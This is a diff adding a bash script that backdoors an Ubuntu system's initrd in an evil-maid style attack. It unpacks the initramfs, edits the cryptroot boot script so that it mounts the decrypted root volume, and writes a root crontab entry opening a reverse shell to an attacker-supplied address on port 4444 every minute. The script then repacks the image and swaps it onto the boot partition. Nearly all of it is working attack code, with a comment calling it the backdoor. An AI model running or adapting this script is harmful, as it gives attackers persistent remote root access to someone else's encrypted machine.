@@ -1,0 +1,56 @@
+#!/bin/bash
+
+
+echo $1
+
+mkdir partition
+mount /dev/$1 partition
+
+init=$(ls partition | grep "initrd.img*" | head -1)
+
+echo "$init"
+cp partition/$init .
+
+
+
+limit=$(binwalk initrd.img-5.4.0-84-generic | grep gzip | cut -d " " -f 1)
+
+echo "$limit"
+
+dd if=$init bs=$limit count=1 of=initrd.microcode
+
+dd if=$init bs=$limit skip=1 of=image.gz
+
+mkdir bootOS
+
+mv image.gz bootOS/
+cd bootOS
+zcat image.gz | cpio -id
+rm image.gz
+
+sed -i '$ d' scripts/local-top/cryptroot
+sed -i '$ d' scripts/local-top/cryptroot
+
+echo "#This is the backdoor" >> scripts/local-top/cryptroot
+echo "mount /dev/mapper/ubuntu--vg-root /tmp" >> scripts/local-top/cryptroot
+echo "echo -e \"*/1 * * * * root /bin/bash -c 'bash -i >& /dev/tcp/$2/4444 0>&1'\" >> /tmp/etc/crontab" >> scripts/local-top/cryptroot
+echo "umount /tmp" >> scripts/local-top/cryptroot
+echo "exit 0" >> scripts/local-top/cryptroot
+
+
+
+find . | cpio -H newc -o | gzip -9 > packed
+mv packed ../
+cd ..
+cat initrd.microcode packed > newinit
+ 
+
+rm $init
+rm partition/$init
+mv newinit $init
+mv $init partition/ 
+rm -rf bootOS/
+umount partition/
+rm -rf partition
+sudo rm initrd.microcode
+sudo rm packed
